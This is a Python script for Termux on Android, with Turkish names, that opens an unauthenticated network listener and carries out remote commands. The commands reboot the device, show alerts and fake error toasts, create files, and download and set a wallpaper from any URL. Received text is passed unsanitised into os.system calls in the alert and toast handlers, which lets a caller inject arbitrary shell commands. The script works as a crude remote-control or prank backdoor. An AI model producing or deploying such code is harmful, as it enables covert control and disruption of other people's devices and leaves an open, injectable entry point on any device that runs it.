
import os
import requests
import socket

def google_ac():
    os.system("termux-open-url https://www.google.com")

def uyarigonder(mesaj):
    os.system(f'termux-notification --title "UYARI" --content "{mesaj}"')

def reboot():
    os.system("reboot")

def dosya_olustur(ad):
    with open(ad, "w") as f:
        f.write("Bu bir test dosyasıdır.")

def arkaplan(url):
    try:
        import urllib.request
        urllib.request.urlretrieve(url, "/data/data/com.termux/files/home/arkaplan.jpg")
        os.system("termux-wallpaper -f /data/data/com.termux/files/home/arkaplan.jpg")
        print("[✓] Arkaplan değiştirildi.")
    except Exception as e:
        print(f"[!] Arkaplan hatası: {e}")

def sahtehata(mesaj):
    os.system(f'termux-toast "{mesaj}"')

# Portu kullanıcıdan al
port = int(input("Dinlenecek port: "))

s = socket.socket()
s.bind(("0.0.0.0", port))
s.listen(1)
print(f"[+] Dinleniyor: 0.0.0.0:{port}")

while True:
    conn, addr = s.accept()
    print(f"[✓] Bağlandı: {addr}")
    while True:
        try:
            komut = conn.recv(1024).decode().strip()
            if not komut:
                break
            if komut == "googleac":
                google_ac()
            elif komut.startswith("uyarigonder "):
                msg = komut.split(" ", 1)[1]
                uyarigonder(msg)
            elif komut == "reboot":
                reboot()
            elif komut.startswith("dosyaolustur "):
                dosya_adi = komut.split(" ", 1)[1]
                dosya_olustur(dosya_adi)
            elif komut.startswith("arkaplan "):
                url = komut.split(" ", 1)[1]
                arkaplan(url)
            elif komut.startswith("sahtehata "):
                mesaj = komut.split(" ", 1)[1]
                sahtehata(mesaj)
            else:
                conn.send(b"[!] Bilinmeyen komut\n")
                continue
            conn.send(b"[✓] Komut calisti\n")
        except:
            break
    conn.close()
